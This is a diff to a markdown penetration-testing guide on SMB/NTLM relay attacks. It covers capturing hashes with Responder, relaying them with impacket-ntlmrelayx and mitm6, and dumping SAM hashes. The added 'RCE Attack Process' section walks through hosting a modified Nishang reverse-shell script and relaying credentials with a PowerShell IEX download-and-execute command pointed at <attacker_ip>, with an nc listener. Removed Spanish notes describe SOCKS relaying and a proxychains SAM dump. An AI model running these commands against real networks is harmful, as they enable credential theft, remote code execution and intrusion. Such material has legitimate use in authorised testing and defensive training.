@@ -29,15 +29,18 @@ sudo nano /etc/responder/Responder.conf
 - Responder is a tool used to capture SMB/NTLM authentication attempts from victims. It works by spoofing services like SMB, DNS, and HTTP to trick devices into sending authentication requests to the attacker.
 
 ```bash
-responder -I eth0
+sudo responder -I eth0 
 ```
 
 
 2. **Setting Up SMB Relay with Impacket**:
-- Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to.
+- Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to. You can identify the hosts with SMB enabled using:
+```bash
+nxc smb 192.168.1.0/24
+```
 - While the Responder is active use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
 3. **Gaining access**:
 Perform post-authentication actions:
@@ -46,12 +49,33 @@ Perform post-authentication actions:
 - Execute commands remotely.
 - Create a reverse shell.
 ```bash
-ntlmrelayx.py -tf targets.txt --dump
-ntlmrelayx.py -tf targets.txt -c "whoami"
+sudo impacket-ntlmrelayx -tf targets.txt --dump
+sudo impacket-ntlmrelayx -tf targets.txt -c "whoami"
 ```
 
-
-
+## RCE Attack Process
+- Copy the PowerShell Invoke-PowershellTCP.ps1 script and open it for editing. 
+```bash
+cp Invoke-PowershellTCP.ps1 PS.ps1
+nano PS.ps1
+```
+- Add the following line at the end of the file:
+```bash
+Invoke-PowershellTCP -reverse -IPAddress <attacker_ip> -Port 4444
+```
+- Start a Python HTTP server and a listener:
+```bash
+pyhton3 -m http.server 80
+nc -lvnp 4444
+```
+- Run the responder service to capture authentication attempts 
+```bash
+sudo responder -I eth0 
+```
+- Execute the NTLMRelay inducing to fetch and execute the hosted script.
+```bash
+sudo impacket-ntlmrelayx -tf targets.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://<attacker_ip>:80/PS.ps1')"
+```
 ## IPv6 SMB Relaying Attack Process
 IPv6 relaying leverages the fact that many modern networks have IPv6 enabled by default, even if administrators primarily use IPv4. Attackers exploit IPv6 name resolution to trick clients into authenticating against a rogue server controlled by the attacker, allowing NTLM credentials to be captured and relayed.
 
@@ -69,7 +93,7 @@ mitm6 -d <domain>
 - When a client attempts to access any SMB or HTTP resource in the domain, it authenticates using NTLMv2.
 - The authentication request is sent to the attacker instead of the legitimate server.
 
-3. **Relay with NTLMRelayx.py:**
+2. **Relay with NTLMRelayx:**
 
 - Relay these IPv6-captured NTLM credentials to a target system:
 ```bash
@@ -115,11 +139,3 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
 ```
 
 
-nishang/shells invokepowershelltcp.ps1  anadir codigo malicioso para que mande una reverse a un puerto abierto
-
-
-para ipv6 usar mitm6 -d dominio
-hacer ntlmrelay indicando -6 ... -socks -debug -smb2support
-
-luego con proxychains para poder conectarse via socks a la cuenta a la que se tiene relay hacer
-proxychauns nxc smb target -u user -p cualquier coas -d dominio --sam 2>/dev/null
